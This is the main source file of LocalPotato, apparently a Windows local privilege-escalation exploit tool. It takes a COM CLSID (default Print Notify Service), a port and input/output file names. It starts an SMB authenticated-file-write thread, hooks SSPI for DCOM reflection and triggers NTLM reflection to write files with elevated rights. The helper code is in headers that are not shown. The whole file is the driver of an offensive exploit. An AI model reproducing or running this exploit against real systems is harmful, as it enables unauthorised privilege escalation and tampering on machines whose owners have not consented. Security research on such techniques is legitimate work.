#include "Windows.h"
#include "stdio.h"
#include "DCOMReflection.h"
#include "PotatoTrigger.h"
#include "SMBClient.h"
#include <winternl.h>
#include <Psapi.h>
void usage();
wchar_t* destfname;
wchar_t* inputfname;


int wmain(int argc, wchar_t** argv) 
{
	printf("\n\n\t LocalPotato\n");
	printf("\t by splinter_code & decoder_it\n\n");

	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
	WCHAR defaultComPort[] = L"12345";
	PWCHAR clsidStr = defaultClsidStr;
	PWCHAR comPort = defaultComPort;
	int cnt = 1;
	while ((argc > 1) && (argv[cnt][0] == '-'))
	{
		switch (argv[cnt][1])
		{
		case 'c':
			++cnt;
			--argc;
			clsidStr = argv[cnt];
			break;

		case 'p':
			++cnt;
			--argc;
			comPort = argv[cnt];
			break;

		case 'h':
			usage();
			exit(0);
		case 'o':
			++cnt;
			--argc;
			if (*argv[cnt] == '\\')
				++argv[cnt];
			destfname = argv[cnt];
			break;
		case 'i':
			++cnt;
			--argc;
			inputfname = argv[cnt];
			break;

		default:
			printf("Wrong Argument: %S\n", argv[cnt]);
			usage();
			exit(-1);
		}
		++cnt;
		--argc;
	}
	HANDLE hTread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SMBAuthenticatedFileWrite), NULL, 0, NULL);
	HookSSPIForDCOMReflection();
	PotatoTrigger(clsidStr, comPort, hTread);
	WaitForSingleObject(hTread, INFINITE);
	return 0;
}

void usage()
{
	printf("\n");
	printf("Args: \n"
		"-c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
		"-p COM server port (Default 12345)\n"
	);
}